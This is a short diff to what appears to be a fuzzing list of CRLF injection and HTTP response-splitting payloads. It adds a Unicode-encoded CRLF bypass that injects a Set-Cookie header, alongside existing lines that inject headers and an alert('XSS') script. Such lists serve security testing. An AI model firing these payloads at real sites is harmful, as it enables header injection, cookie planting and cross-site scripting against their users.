@@ -18,3 +18,4 @@ r%0d%0aContentLength:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContentType:%20tex
 %0AContent-type:%20text/html%0A%0Ahttp://www.test.com/%3Cscript%3Ealert(%22XSS%22)%3C/script%3E
 %0d%0a%0d%0a%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E
 %0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E
+%E5%98%8A%E5%98%8DSet-Cookie:%20test
